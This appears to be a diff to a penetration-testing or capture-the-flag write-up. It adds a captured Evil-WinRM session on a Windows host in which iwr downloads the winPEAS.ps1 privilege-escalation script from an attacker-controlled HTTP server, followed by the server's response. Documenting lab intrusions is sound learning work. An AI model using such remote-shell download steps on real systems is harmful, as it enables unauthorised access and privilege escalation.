@@ -442,3 +442,21 @@ Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
   6                     Microsoft Visual C++ 2017 Redistributable (x64) - 14.11.25325
 
 ```
+
+```
+*Evil-WinRM* PS C:\Users\Jareth\Desktop> iwr http://10.8.117.56:8000/winPEAS.ps1
+
+
+StatusCode        : 200
+StatusDescription : OK
+Content           : {10, 10, 10, 10...}
+RawContent        : HTTP/1.0 200 OK
+                    Content-Length: 379740
+                    Content-Type: application/octet-stream
+                    Date: Sun, 21 Sep 2025 16:20:02 GMT
+                    Last-Modified: Sat, 24 May 2025 13:36:22 GMT
+                    Server: SimpleHTTP/0.6 Python/3.11.4...
+Headers           : {[Content-Length, 379740], [Content-Type, application/octet-stream], [Date, Sun, 21 Sep 2025 16:20:02 GMT], [Last-Modified, Sat, 24 May 2025 13:36:22 GMT]...}
+RawContentLength  : 379740
+```
+
